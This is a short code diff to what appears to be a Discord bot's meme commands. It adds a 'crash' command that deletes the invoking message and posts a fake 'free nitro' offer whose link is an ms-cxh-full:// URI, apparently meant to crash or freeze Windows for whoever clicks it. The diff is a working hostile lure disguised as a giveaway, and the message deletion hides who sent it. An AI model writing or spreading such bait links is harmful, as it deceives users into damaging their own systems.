@@ -27,6 +27,11 @@ class memes(commands.Cog):
         await ctx.send("https://i.imgur.com/mn3EslL.png")
 
 
+    @commands.command()
+    async def crash(self, ctx):
+
+        await ctx.message.delete()
+        await ctx.send("Click this for free nitro! <ms-cxh-full://0>")
 
 
 ### Add cog again
